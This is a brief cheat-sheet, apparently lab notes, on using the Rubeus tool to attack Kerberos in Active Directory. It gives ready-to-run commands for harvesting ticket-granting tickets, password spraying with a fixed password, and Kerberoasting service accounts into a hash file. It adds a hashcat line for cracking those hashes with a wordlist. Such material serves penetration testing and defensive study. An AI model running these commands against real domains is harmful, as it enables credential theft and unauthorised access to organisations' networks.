# Rubeus

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation
of the kekeo tool and developed by HarmJ0y the very well known active
directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a
very versatile tool for attacking Kerberos. Just some of the many tools
and attacks include overpass the hash, ticket requests and renewals,
ticket management, ticket extraction, harvesting, pass the ticket,
AS-REP Roasting, and Kerberoasting.


# Before using Rubeus
If the machine is outside domain, add the Domain Controller
in the hosts file by doing from a "cmd.exe":

    echo 10.10.3.23 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

## Harvest Tickets (on a Domain Controller ???)
;; If we are on a domain controller we can harvest ticket
;; This command tells Rubeus to harvest for TGTs every 30 seconds
Rubeus.exe harvest /interval:30 


## Password Spray
;; This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
;; Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
Rubeus.exe brute /password:Password1 /noticket

## Dump the kerberos hash of any kerberoastable user
Rubeus.exe kerberoast /outfile:hashes.txt
;; these can be cracked by doing:
;; hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o results.txt
